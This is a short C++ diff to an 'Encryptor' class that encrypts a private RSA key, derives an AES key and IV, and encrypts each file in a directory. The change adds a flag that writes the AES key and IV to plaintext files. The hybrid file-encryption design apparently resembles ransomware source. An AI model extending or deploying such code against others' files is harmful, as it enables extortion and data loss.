@@ -42,7 +42,7 @@ void Encryptor::validateAESKeyLength(std::string &aeskey, std::string &aesiv)
 
 }
 
-void Encryptor::invokeDir(const std::string &path)
+void Encryptor::invokeDir(const std::string &path, bool protection)
 {
     // Encrypt the CPrivateRSA.pem String to CPrivateRSA.bin
     encryptCPrivateRSA();
@@ -54,10 +54,14 @@ void Encryptor::invokeDir(const std::string &path)
     std::string aeskey, aesiv;
     validateAESKeyLength(aeskey, aesiv);
 
-    // If --protect is enabled
-    //LOG_TRACE("Length of AESKEY: " << aeskey.length() << " and length of AESIV: " << aesiv.length());
-    //butterfly::writeBinFile("AESKey.txt", aeskey.c_str(), static_cast<long>(aeskey.length()));
-    //butterfly::writeBinFile("AESIV.txt", aesiv.c_str(), static_cast<long>(aesiv.length()));
+    // If --protected is enabled
+    if (protection)
+    {
+        //LOG_TRACE("Length of AESKEY: " << aeskey.length() << " and length of AESIV: " << aesiv.length());
+        butterfly::writeBinFile("AESKey_protected.txt", aeskey.c_str(), static_cast<long>(aeskey.length()));
+        butterfly::writeBinFile("AESIV_protected.txt", aesiv.c_str(), static_cast<long>(aesiv.length()));
+    }
+
 
     for (auto &file: files)
     {
